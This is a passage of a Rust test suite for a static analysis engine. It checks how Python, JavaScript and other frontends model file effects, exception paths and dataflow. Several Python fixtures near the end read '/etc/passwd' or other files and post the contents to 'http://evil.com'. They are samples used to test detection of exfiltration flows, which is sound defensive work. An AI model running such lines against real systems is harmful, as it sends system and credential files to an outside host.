//! Language-level dataflow (def-use) acceptance battery for the Python and
//! JavaScript/TS frontends. Every assertion states a mechanical fact — "there
//! is a `data_flow` edge from the read effect's stage to the upload effect's
//! stage" — never a judgment about whether the flow is dangerous. The negative
//! cases (no edge, rebound variable, no shared variable) are the point: they
//! prove the graph does not invent paths.

use effinterp_engine::Engine;
use effinterp_proto::{
    CausalReason, OccurrenceKind, Plan, Port, SourceDialect, Subject, validate_plan,
};

fn py(source: &str) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Source {
            dialect: None,
            language: "python".into(),
            source: source.to_string(),
            cwd: Some("/work".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {source:?}: {e:?}"));
    plan
}

#[test]
fn required_sink_occurrences_agree_with_causal_cardinality() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};

    let cases = [
        (
            "shell",
            "echo before > /before\nif test -f /flag; then echo a > /arm; else echo b > /arm; fi\necho tail > /tail\n",
        ),
        (
            "python",
            "import os\nos.remove('/before')\nif flag:\n os.remove('/arm')\nelse:\n os.remove('/arm')\nos.remove('/tail')\n",
        ),
        (
            "js",
            "const fs = require('fs'); fs.unlinkSync('/before'); if (flag) { fs.unlinkSync('/arm'); } else { fs.unlinkSync('/arm'); } fs.unlinkSync('/tail');",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc main() { os.Remove(\"/before\"); if flag { os.Remove(\"/arm\") } else { os.Remove(\"/arm\") }; os.Remove(\"/tail\") }",
        ),
        (
            "ruby",
            "flag = true\nFile.delete('/before')\nif flag\n File.delete('/arm')\nelse\n File.delete('/arm')\nend\nFile.delete('/tail')\n",
        ),
        (
            "php",
            "<?php unlink('/before'); if ($flag) { unlink('/arm'); } else { unlink('/arm'); } unlink('/tail');",
        ),
        (
            "java",
            "import java.nio.file.Files; import java.nio.file.Path; class A { public static void main(String[] args) { Files.delete(Path.of(\"/before\")); if (args.length > 0) { Files.delete(Path.of(\"/arm\")); } else { Files.delete(Path.of(\"/arm\")); } Files.delete(Path.of(\"/tail\")); } }",
        ),
        (
            "rust",
            "fn main() { std::fs::remove_file(\"/before\"); if flag { std::fs::remove_file(\"/arm\"); } else { std::fs::remove_file(\"/arm\"); } std::fs::remove_file(\"/tail\"); }",
        ),
    ];
    for (language, source) in cases {
        let subject = if language == "shell" {
            Subject::Shell {
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            }
        } else {
            Subject::Source {
                language: language.into(),
                dialect: (language == "js").then_some(SourceDialect::Js),
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            }
        };
        let plan = Engine::new()
            .with_causality_detail(true)
            .analyze(&subject)
            .unwrap();
        validate_plan(&plan).unwrap();
        for (path, modality, count) in [
            ("/before", Modality::MustOnSuccess, 1),
            ("/arm", Modality::May, 2),
            ("/tail", Modality::MustOnSuccess, 1),
        ] {
            let matches_resource = |resource: &ResourceExpr| matches!(resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == path);
            let effects: Vec<_> = plan
                .effects
                .iter()
                .filter(|effect| {
                    matches!(
                        effect.operation.0.as_str(),
                        "filesystem.write" | "filesystem.delete"
                    ) && matches_resource(&effect.resource)
                })
                .collect();
            assert_eq!(effects.len(), count, "{language} {path}: {effects:?}");
            assert!(
                effects.iter().all(|effect| effect.modality == modality),
                "{language} {path}: {effects:?}"
            );
            let occurrences: Vec<_> = plan.causality.graph.as_ref().unwrap().nodes.iter().filter(|node| {
                matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, resource, .. } if matches!(operation.0.as_str(), "filesystem.write" | "filesystem.delete") && matches_resource(resource))
            }).collect();
            assert_eq!(occurrences.len(), count, "{language} {path}");
            for occurrence in occurrences {
                assert_eq!(occurrence.modality, modality, "{language} {path}");
                assert_eq!(
                    occurrence.cardinality.min,
                    u32::from(modality == Modality::MustOnSuccess),
                    "{language} {path}"
                );
            }
        }
    }
}

#[test]
fn recognized_source_aborts_are_not_normal_completions() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for (language, source, abort, conditional) in [
        (
            "python",
            "import os, sys\nos.remove('/before')\nSTOP\nos.remove('/after')\n",
            "sys.exit(0)",
            "if flag: sys.exit(0)",
        ),
        (
            "ruby",
            "flag = false\nFile.delete('/before')\nSTOP\nFile.delete('/after')\n",
            "exit(0)",
            "exit(0) if flag",
        ),
        (
            "php",
            "<?php unlink('/before'); STOP unlink('/after');",
            "exit(0);",
            "if ($flag) { exit(0); }",
        ),
        (
            "go",
            "package main\nimport \"os\"\nfunc main() { os.Remove(\"/before\"); STOP; os.Remove(\"/after\") }",
            "os.Exit(0)",
            "if flag { os.Exit(0) }",
        ),
        (
            "java",
            "import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { Files.delete(Path.of(\"/before\")); STOP Files.delete(Path.of(\"/after\")); } }",
            "System.exit(0);",
            "if (args.length > 0) { System.exit(0); }",
        ),
    ] {
        for (stop, modality) in [
            (abort, Modality::May),
            (conditional, Modality::MustOnSuccess),
        ] {
            let plan = Engine::new()
                .with_causality_detail(true)
                .analyze(&Subject::Source {
                    language: language.into(),
                    dialect: None,
                    source: source.replace("STOP", stop),
                    cwd: Some("/work".into()),
                    context: Default::default(),
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            for path in ["/before", "/after"] {
                let effects: Vec<_> = plan.effects.iter().filter(|effect| {
                    effect.operation.0 == "filesystem.delete" && matches!(&effect.resource,
                        ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: actual } } if actual == path)
                }).collect();
                assert_eq!(
                    effects.len(),
                    1,
                    "{language} {stop} {path}: {:?}",
                    plan.effects
                );
                assert_eq!(effects[0].modality, modality, "{language} {stop} {path}");
            }
        }
    }
}

#[test]
fn callable_lookup_can_fail_before_effectful_arguments() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for (known, modality) in [(false, Modality::May), (true, Modality::MustOnSuccess)] {
        let target = if known { "g" } else { "obj.missing" };
        let python = format!(
            "import os\ndef g(value): pass\ndef f(obj):\n try:\n  {target}(os.remove('/arg'))\n finally:\n  return\nf(data)\n"
        );
        let javascript = format!(
            "const fs = require('fs'); function g(value) {{}} function f(obj) {{ try {{ {target}(fs.unlinkSync('/arg')); }} finally {{ return; }} }} f(data);"
        );
        for (language, source) in [("python", python), ("js", javascript)] {
            let plan = Engine::new()
                .with_causality_detail(true)
                .analyze(&Subject::Source {
                    language: language.into(),
                    dialect: (language == "js").then_some(SourceDialect::Js),
                    source,
                    cwd: Some("/work".into()),
                    context: Default::default(),
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete"
                && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/arg")).collect();
            assert_eq!(effects.len(), 1, "{language} {known}: {:?}", plan.effects);
            assert_eq!(effects[0].modality, modality, "{language} {known}");
        }
    }
}

#[test]
fn exceptional_completion_and_finalizers_preserve_necessity() {
    use effinterp_proto::{
        Modality::{May, MustOnSuccess},
        ResourceExpr, ResourceIdentity,
    };
    for (case, python, js_body, ruby, php, java, cleanup, before, after) in [
        (
            "explicit",
            "if flag: raise RuntimeError\n  os.remove('/out')",
            "if (flag) throw 1; fs.unlinkSync('/out');",
            "raise 'stop' if flag; File.delete('/out')",
            "if ($flag) { throw $e; } unlink('/out');",
            "if (flag) throw null; Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "implicit",
            "os.remove('/first')\n  os.remove('/out')",
            "fs.unlinkSync('/first'); fs.unlinkSync('/out');",
            "File.delete('/first'); File.delete('/out')",
            "unlink('/first'); unlink('/out');",
            "Files.delete(first); Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "never",
            "while True: pass",
            "while (true) {}",
            "while true; end",
            "while (true) {}",
            "while (true) {}",
            true,
            May,
            None,
        ),
        (
            "operator",
            "1 / 0\n  os.remove('/out')",
            "1n / 0n; fs.unlinkSync('/out');",
            "1 / 0; File.delete('/out')",
            "1 / 0; unlink('/out');",
            "int ignored = 1 / 0; Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "member",
            "None.field\n  os.remove('/out')",
            "null.field; fs.unlinkSync('/out');",
            "nil.field; File.delete('/out')",
            "1 + []; unlink('/out');",
            "int ignored = ((Box)null).value; Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "subscript",
            "[][0]\n  os.remove('/out')",
            "null[0]; fs.unlinkSync('/out');",
            "nil[0]; File.delete('/out')",
            "$data = 'x'; $ignored = $data[[]]; unlink('/out');",
            "int ignored = ((int[])null)[0]; Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "type_error",
            "1 + 'x'\n  os.remove('/out')",
            "1n + 1; fs.unlinkSync('/out');",
            "1 + 'x'; File.delete('/out')",
            "1 + []; unlink('/out');",
            "Object ignored = (String)(Object)1; Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "callee_throw",
            "g()\n  os.remove('/out')",
            "g(); fs.unlinkSync('/out');",
            "g(); File.delete('/out')",
            "g(); unlink('/out');",
            "g(); Files.delete(out);",
            true,
            MustOnSuccess,
            Some(May),
        ),
        (
            "callee_never",
            "g()\n  os.remove('/out')",
            "g(); fs.unlinkSync('/out');",
            "g(); File.delete('/out')",
            "g(); unlink('/out');",
            "g(); Files.delete(out);",
            true,
            May,
            Some(May),
        ),
        (
            "throw_cleanup",
            "raise RuntimeError",
            "throw 1;",
            "raise 'stop'",
            "throw null;",
            "throw null;",
            false,
            MustOnSuccess,
            Some(MustOnSuccess),
        ),
        (
            "cleanup",
            "return",
            "return;",
            "return",
            "return;",
            "return;",
            false,
            MustOnSuccess,
            Some(MustOnSuccess),
        ),
    ] {
        let sources = [
            (
                "python",
                format!(
                    "import os\ndef g():\n {}\ndef f(flag):\n os.remove('/pre')\n try:\n  {python}\n finally:\n  {}\nf(True)\n",
                    if case == "callee_never" {
                        "while True: pass"
                    } else {
                        "raise RuntimeError"
                    },
                    if cleanup {
                        "return"
                    } else if case == "throw_cleanup" {
                        "os.remove('/out'); return"
                    } else {
                        "os.remove('/out')"
                    }
                ),
            ),
            (
                "js",
                format!(
                    "const fs = require('fs'); function g() {{ {} }} function f(flag) {{ fs.unlinkSync('/pre'); try {{ {js_body} }} finally {{ {} }} }} f(true);",
                    if case == "callee_never" {
                        "while (true) {}"
                    } else {
                        "throw 1;"
                    },
                    if cleanup {
                        "return;"
                    } else if case == "throw_cleanup" {
                        "fs.unlinkSync('/out'); return;"
                    } else {
                        "fs.unlinkSync('/out');"
                    }
                ),
            ),
            (
                "ruby",
                format!(
                    "def g()\n {}\nend\ndef f(flag)\n File.delete('/pre')\n begin\n {ruby}\n ensure\n {}\n end\nend\nf(true)\n",
                    if case == "callee_never" {
                        "while true; end"
                    } else {
                        "raise 'stop'"
                    },
                    if cleanup {
                        "return"
                    } else if case == "throw_cleanup" {
                        "File.delete('/out'); return"
                    } else {
                        "File.delete('/out')"
                    }
                ),
            ),
            (
                "php",
                format!(
                    "<?php function g() {{ {} }} function f($flag, $e) {{ unlink('/pre'); try {{ {php} }} finally {{ {} }} }} f(true, null);",
                    if case == "callee_never" {
                        "while (true) {}"
                    } else {
                        "throw null;"
                    },
                    if cleanup {
                        "return;"
                    } else if case == "throw_cleanup" {
                        "unlink('/out'); return;"
                    } else {
                        "unlink('/out');"
                    }
                ),
            ),
            (
                "java",
                format!(
                    "import java.nio.file.Files; import java.nio.file.Path; class App {{ static class Box {{ int value; }} static void g() {{ {} }} static void f(boolean flag, Path pre, Path first, Path out) throws Exception {{ Files.delete(pre); try {{ {java} }} finally {{ {} }} }} public static void main(String[] args) throws Exception {{ f(true, Path.of(\"/pre\"), Path.of(\"/first\"), Path.of(\"/out\")); }} }}",
                    if case == "callee_never" {
                        "while (true) {}"
                    } else {
                        "throw null;"
                    },
                    if cleanup {
                        "return;"
                    } else if case == "throw_cleanup" {
                        "Files.delete(out); return;"
                    } else {
                        "Files.delete(out);"
                    }
                ),
            ),
        ];
        for (language, source) in sources {
            let caught = match language {
                "python" => source.replace(
                    "finally:\n  return",
                    "except Exception:\n  pass\n os.remove('/tail')",
                ),
                "js" => source.replace(
                    "finally { return; }",
                    "catch (error) {} fs.unlinkSync('/tail');",
                ),
                "ruby" => source.replace("ensure\n return", "rescue Exception\n nil"),
                "php" => source.replace("finally { return; }", "catch (Throwable $error) {}"),
                "java" => source.replace("finally { return; }", "catch (Exception error) {}"),
                _ => unreachable!(),
            };
            for (handler, source) in
                std::iter::once(("finally", source)).chain(cleanup.then_some(("catch", caught)))
            {
                let plan = Engine::new()
                    .with_causality_detail(true)
                    .analyze(&Subject::Source {
                        language: language.into(),
                        dialect: (language == "js").then_some(SourceDialect::Js),
                        source,
                        cwd: Some("/work".into()),
                        context: Default::default(),
                    })
                    .unwrap();
                validate_plan(&plan).unwrap();
                for (path, expected) in std::iter::once(("/pre", before))
                    .chain(after.map(|expected| ("/out", expected)))
                    .chain((case == "implicit").then_some(("/first", MustOnSuccess)))
                    .chain(
                        (handler == "catch" && matches!(language, "python" | "js"))
                            .then_some(("/tail", before)),
                    )
                {
                    let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete" && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: found } } if found == path)).collect();
                    assert_eq!(
                        effects.len(),
                        1,
                        "{language} {case} {handler} {path}: {:?}",
                        plan.effects
                    );
                    assert_eq!(
                        effects[0].modality, expected,
                        "{language} {case} {handler} {path}"
                    );
                }
            }
        }
    }
}

#[test]
fn typed_handlers_do_not_invent_normal_completion() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for (language, source, expected) in [
        (
            "ruby",
            "RuntimeError = ArgumentError\nbegin\n raise 'stop'\nrescue RuntimeError\n nil\nend\nFile.delete('/out')\n",
            Modality::May,
        ),
        (
            "ruby",
            "begin\n begin\n  raise ArgumentError\n rescue ArgumentError\n  raise\n end\nrescue RuntimeError\n File.delete('/out')\nend\n",
            Modality::May,
        ),
        (
            "php",
            "<?php try { throw null; } catch (Vendor\\Throwable $error) {} unlink('/out');",
            Modality::May,
        ),
        (
            "php",
            "<?php try { throw null; } catch (TypeError $error) {} unlink('/out');",
            Modality::May,
        ),
        (
            "java",
            "import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { try { throw null; } catch (custom.Throwable error) {} Files.delete(Path.of(\"/out\")); } }",
            Modality::May,
        ),
        (
            "java",
            "import custom.Throwable; import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { try { throw null; } catch (Throwable error) {} Files.delete(Path.of(\"/out\")); } }",
            Modality::May,
        ),
        (
            "python",
            "import os\ntry:\n raise RuntimeError\nexcept ValueError:\n pass\nos.remove('/out')\n",
            Modality::May,
        ),
        (
            "python",
            "import os\ntry:\n raise RuntimeError\nexcept Exception:\n pass\nos.remove('/out')\n",
            Modality::MustOnSuccess,
        ),
        (
            "python",
            "import os, sys\ntry:\n sys.exit(0)\nexcept Exception:\n os.remove('/out')\n",
            Modality::May,
        ),
        (
            "python",
            "import os, sys\ntry:\n sys.exit(0)\nexcept:\n os.remove('/out')\n",
            Modality::MustOnSuccess,
        ),
        (
            "python",
            "import os\ndef f():\n try:\n  os.remove('/first')\n except ValueError:\n  return\n os.remove('/out')\nf()\n",
            Modality::May,
        ),
        (
            "ruby",
            "begin\n raise 'stop'\nrescue ArgumentError\n nil\nend\nFile.delete('/out')\n",
            Modality::May,
        ),
        (
            "ruby",
            "begin\n raise 'stop'\nrescue RuntimeError\n nil\nend\nFile.delete('/out')\n",
            Modality::MustOnSuccess,
        ),
        (
            "python",
            "import os\nRuntimeError = ValueError\ntry:\n raise RuntimeError\nexcept Exception:\n pass\nos.remove('/out')\n",
            Modality::May,
        ),
        (
            "python",
            "import os\nclass E:\n pass\ntry:\n raise E\nexcept E:\n pass\nos.remove('/out')\n",
            Modality::May,
        ),
        (
            "java",
            "import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { try { throw null; } catch (Error error) {} Files.delete(Path.of(\"/out\")); } }\n",
            Modality::May,
        ),
        (
            "java",
            "import java.nio.file.Files; import java.nio.file.Path; class App { public static void main(String[] args) throws Exception { try { throw null; } catch (Exception error) {} Files.delete(Path.of(\"/out\")); } }\n",
            Modality::MustOnSuccess,
        ),
        (
            "php",
            "<?php try { throw null; } catch (Exception $error) {} unlink('/out');\n",
            Modality::May,
        ),
        (
            "php",
            "<?php try { throw null; } catch (Throwable $error) {} unlink('/out');\n",
            Modality::MustOnSuccess,
        ),
        (
            "python",
            "import os\nRuntimeError = 1\ndef f():\n try:\n  raise RuntimeError\n except Exception:\n  pass\n os.remove('/out')\nf()\n",
            Modality::May,
        ),
        (
            "python",
            "import os\nE = 1\ntry:\n raise E\nexcept E:\n pass\nos.remove('/out')\n",
            Modality::May,
        ),
        (
            "python",
            "import os\ndef g():\n try:\n  raise x\n except ValueError:\n  return\nif flag:\n g()\nelse:\n os.remove('/out')\n",
            Modality::May,
        ),
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Source {
                language: language.into(),
                dialect: None,
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/out")).collect();
        assert_eq!(effects.len(), 1, "{language} {source}");
        assert_eq!(effects[0].modality, expected, "{language} {source}");
    }
}

#[test]
fn nested_maybe_handler_does_not_witness_inner_match() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for source in [
        "import os\ntry:\n raise x\nexcept ValueError:\n try:\n  raise RuntimeError\n except Exception:\n  os.remove('/caught')\nos.remove('/after')\n",
        "import os\ndef f():\n try:\n  raise x\n except ValueError:\n  try:\n   os.remove('/caught')\n  finally:\n   return\nf()\nos.remove('/after')\n",
    ] {
        let plan = Engine::new()
            .analyze(&Subject::Source {
                language: "python".into(),
                dialect: None,
                source: source.into(),
                cwd: Some("/work".into()),
                context: Default::default(),
            })
            .unwrap();
        validate_plan(&plan).unwrap();
        for path in ["/caught", "/after"] {
            let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: found } } if found == path)).collect();
            assert_eq!(effects.len(), 1, "{path}");
            assert_eq!(effects[0].modality, Modality::May, "{path}");
        }
    }
}

#[test]
fn certain_failures_have_no_normal_continuation() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for (language, body) in [
        ("python", "1 / 0"),
        ("python", "1.0 / 0.0"),
        ("python", "None.field"),
        ("python", "[][0]"),
        ("python", "a, b = []"),
        ("js", "null.field;"),
        ("js", "1n / 0n;"),
        ("js", "const a = 0; a = 1;"),
        ("js", "const a = 0; a++;"),
    ] {
        let plan = match language {
            "python" => py(&format!(
                "import os\nos.remove('/before')\n{body}\nos.remove('/after')\n"
            )),
            "js" => js(&format!(
                "const fs = require('fs'); fs.unlinkSync('/before'); {body} fs.unlinkSync('/after');"
            )),
            _ => unreachable!(),
        };
        for path in ["/before", "/after"] {
            let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete"
                && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: found } } if found == path)).collect();
            assert_eq!(effects.len(), 1, "{language} {body} {path}");
            assert_eq!(
                effects[0].modality,
                Modality::May,
                "{language} {body} {path}"
            );
        }
    }
    for body in [
        "let a = 0; a++;",
        "const a = 0; { let a = 0; a = 1; }",
        "const a = 0; { let a = 0; a++; }",
        "const a = 0; a &&= 1;",
        "null?.field;",
    ] {
        let plan = js(&format!(
            "const fs = require('fs'); {body} fs.unlinkSync('/after');"
        ));
        let effect = plan
            .effects
            .iter()
            .find(|effect| effect.operation.0 == "filesystem.delete")
            .unwrap();
        assert_eq!(effect.modality, Modality::MustOnSuccess, "{body}");
    }
}

#[test]
fn value_protocol_failures_can_finish_before_later_sinks() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for (language, body) in [
        ("python", "1 < 'x'"),
        ("python", "for item in 1: pass"),
        ("python", "a, b = []"),
        ("python", "a = 1\n  a += 'x'"),
        ("python", "~'x'"),
        ("python", "f'{1:invalid}'"),
        ("python", "[*1]"),
        ("python", "{[]: 1}"),
        ("python", "{[]}"),
        ("python", "assert False"),
        ("python", "def g(value: Missing): pass"),
        ("python", "class C:\n   value: Missing = 1"),
        ("js", "for (const item of 1) {}"),
        ("js", "for (const {a} of [null]) {}"),
        ("js", "let a; for ({a} of [null]) {}"),
        ("js", "const obj = null; for (obj.a of [1]) {}"),
        ("js", "const a = 0; for (a of [1]) {}"),
        ("js", "const a = 0; a = 1;"),
        ("js", "const [a] = null;"),
        ("js", "const {a} = null;"),
        ("js", "function g({a}) { return a; } g(null);"),
        ("js", "function g([a]) { return a; } g(null);"),
        ("js", "+1n;"),
        ("js", "[...1];"),
        ("js", "let a = 1n; a += 1;"),
        ("js", "`${Symbol()}`;"),
        ("js", "1 in 2;"),
        (
            "php",
            "$x = new class { function __get($name) { throw new Exception(); } }; $x->field;",
        ),
    ] {
        for caught in [false, true] {
            let source = match language {
                "python" => format!(
                    "import os\ndef f():\n os.remove('/pre')\n try:\n  {body}\n  os.remove('/out')\n {}\nf()\n",
                    if caught {
                        "except Exception:\n  pass\n os.remove('/tail')"
                    } else {
                        "finally:\n  return"
                    }
                ),
                "js" => format!(
                    "const fs = require('fs'); function f() {{ fs.unlinkSync('/pre'); try {{ {body} fs.unlinkSync('/out'); }} {} }} f();",
                    if caught {
                        "catch (error) {} fs.unlinkSync('/tail');"
                    } else {
                        "finally { return; }"
                    }
                ),
                "php" => format!(
                    "<?php function f() {{ unlink('/pre'); try {{ {body} unlink('/out'); }} {} }} f();",
                    if caught {
                        "catch (Throwable $error) {} unlink('/tail');"
                    } else {
                        "finally { return; }"
                    }
                ),
                _ => unreachable!(),
            };
            let plan = Engine::new()
                .analyze(&Subject::Source {
                    language: language.into(),
                    dialect: (language == "js").then_some(SourceDialect::Js),
                    source,
                    cwd: Some("/work".into()),
                    context: Default::default(),
                })
                .unwrap();
            validate_plan(&plan).unwrap();
            for (path, expected) in [("/pre", Modality::MustOnSuccess), ("/out", Modality::May)]
                .into_iter()
                .chain((caught && language != "php").then_some(("/tail", Modality::MustOnSuccess)))
            {
                let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete" && matches!(&effect.resource,
                    ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path: found } } if found == path)).collect();
                assert_eq!(effects.len(), 1, "{language} {body} caught={caught} {path}");
                assert_eq!(
                    effects[0].modality, expected,
                    "{language} {body} caught={caught} {path}"
                );
            }
        }
    }
}

#[test]
fn destructuring_defaults_are_optional_and_local_annotations_are_inert() {
    use effinterp_proto::{Modality, ResourceExpr, ResourceIdentity};
    for body in [
        "const {a = fs.unlinkSync('/default')} = obj;",
        "const [a = fs.unlinkSync('/default')] = arr;",
        "let a; ({a = fs.unlinkSync('/default')} = obj);",
        "let a; ([a = fs.unlinkSync('/default')] = arr);",
        "function f({a = fs.unlinkSync('/default')}) {} f(obj);",
        "function f([a = fs.unlinkSync('/default')]) {} f(arr);",
        "for (const {a = fs.unlinkSync('/default')} of arr) {}",
        "for (obj[fs.unlinkSync('/default')] of []) {}",
    ] {
        let plan = js(&format!("const fs = require('fs'); {body}"));
        let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/default")).collect();
        assert_eq!(effects.len(), 1, "{body}: {:?}", plan.effects);
        assert_eq!(effects[0].modality, Modality::May, "{body}");
        if body.starts_with("for ") {
            let occurrences: Vec<_> = plan.causality.graph.as_ref().unwrap().nodes.iter().filter(|node| matches!(
                &node.occurrence, OccurrenceKind::ResourceInteraction { operation, resource, .. }
                if operation.0 == "filesystem.delete" && matches!(resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/default"))).collect();
            assert_eq!(occurrences.len(), 1, "{body}");
            assert_eq!(occurrences[0].cardinality.min, 0, "{body}");
            assert_eq!(occurrences[0].cardinality.max, None, "{body}");
        }
    }
    for (source, expected) in [
        (
            "import os\ntry:\n value: Missing = 1\n os.remove('/out')\nexcept Exception:\n pass\n",
            Modality::May,
        ),
        (
            "import os\ndef f():\n try:\n  value: Missing = 1\n  os.remove('/out')\n finally:\n  return\nf()\n",
            Modality::MustOnSuccess,
        ),
    ] {
        let plan = py(source);
        let effects: Vec<_> = plan.effects.iter().filter(|effect| effect.operation.0 == "filesystem.delete"
            && matches!(&effect.resource, ResourceExpr::Concrete { identity: ResourceIdentity::FsPath { path } } if path == "/out")).collect();
        assert_eq!(effects.len(), 1, "{source}: {:?}", plan.effects);
        assert_eq!(effects[0].modality, expected, "{source}");
    }
}

fn js(source: &str) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Source {
            language: "js".into(),
            source: source.to_string(),
            dialect: Some(SourceDialect::Js),
            cwd: Some("/work".to_string()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|e| panic!("invalid plan for {source:?}: {e:?}"));
    plan
}

fn port<'a>(plan: &'a Plan, id: &effinterp_proto::OccurrenceId) -> Option<&'a Port> {
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .find(|node| node.id == *id)
        .and_then(|node| match &node.occurrence {
            OccurrenceKind::Port { port } => Some(port),
            _ => None,
        })
}

fn resource_op<'a>(plan: &'a Plan, id: &effinterp_proto::OccurrenceId) -> Option<&'a str> {
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .nodes
        .iter()
        .find(|node| node.id == *id)
        .and_then(|node| match &node.occurrence {
            OccurrenceKind::ResourceInteraction { operation, .. } => Some(operation.0.as_str()),
            _ => None,
        })
}

fn value_reaches_operation(
    plan: &Plan,
    root: &effinterp_proto::OccurrenceId,
    operation: &str,
) -> bool {
    let mut pending = vec![root.clone()];
    let mut seen = std::collections::BTreeSet::new();
    while let Some(current) = pending.pop() {
        if !seen.insert(current.clone()) {
            continue;
        }
        if resource_op(plan, &current) == Some(operation) {
            return true;
        }
        pending.extend(
            plan.causality
                .graph
                .as_ref()
                .expect("causality detail required")
                .edges
                .iter()
                .filter(|edge| edge.from == current && edge.reason == CausalReason::ValueDependency)
                .map(|edge| edge.to.clone()),
        );
    }
    false
}

/// Whether a `data_flow` edge runs from a stage producing `from_op` to a stage
/// producing `to_op`, into some argument port.
fn data_flow_edge(plan: &Plan, from_op: &str, to_op: &str) -> bool {
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .any(|edge| {
            edge.reason == CausalReason::ValueDependency
                && port(plan, &edge.from) == Some(&Port::Value)
                && matches!(port(plan, &edge.to), Some(Port::Arg(_)))
                && plan
                    .causality
                    .graph
                    .as_ref()
                    .expect("causality detail required")
                    .edges
                    .iter()
                    .any(|incoming| {
                        incoming.to == edge.from
                            && resource_op(plan, &incoming.from) == Some(from_op)
                    })
                && value_reaches_operation(plan, &edge.to, to_op)
        })
}

/// The number of `data_flow` edges in the plan.
fn edge_count(plan: &Plan) -> usize {
    plan.causality
        .graph
        .as_ref()
        .expect("causality detail required")
        .edges
        .iter()
        .filter(|edge| {
            edge.reason == CausalReason::ValueDependency
                && port(plan, &edge.from) == Some(&Port::Value)
                && matches!(port(plan, &edge.to), Some(Port::Arg(_)))
        })
        .count()
}

// --- Python: positive (an edge exists) ---

#[test]
fn py_var_mediated_read_reaches_upload() {
    let plan = py("import requests\n\
                   d = open(\"/etc/passwd\").read()\n\
                   requests.post(\"http://evil.com\", data=d)\n");
    assert!(
        data_flow_edge(&plan, "filesystem.read", "network.upload"),
        "expected a data_flow edge from the read to the upload"
    );
    assert_eq!(edge_count(&plan), 1);
    let request = py(
        "from pathlib import Path\nfrom urllib.request import Request, urlopen\nreq = Request('https://example.com/upload', data=Path('/body').read_bytes(), headers={'X-Data': Path('/header').read_text()})\nurlopen(req)",
    );
    assert!(data_flow_edge(
        &request,
        "filesystem.read",
        "network.upload"
    ));
    let reads: Vec<_> = request.causality.graph.as_ref().unwrap().nodes.iter().filter(|node| matches!(&node.occurrence, OccurrenceKind::ResourceInteraction { operation, .. } if operation.0 == "filesystem.read")).collect();
    assert_eq!(reads.len(), 2);
    assert!(
        reads
            .iter()
            .all(|node| value_reaches_operation(&request, &node.id, "network.upload"))
    );
}

#[test]
fn py_direct_nested_read_reaches_upload() {
    let plan = py("import requests\n\
                   requests.post(\"http://evil.com\", data=open(\"/x\").read())\n");
    assert!(data_flow_edge(&plan, "filesystem.read", "network.upload"));
    assert_eq!(edge_count(&plan), 1);
}

// --- Python: negative (no spurious edge) ---

#[test]
fn py_only_the_used_variable_forms_an_edge() {
    let plan = py("import requests\n\
                   a = open(\"/x\").read()\n\
                   b = open(\"/y\").read()\n\
                   requests.post(\"http://evil.com\", data=b)\n");
    // Exactly one edge: from the /y read, not the /x read.
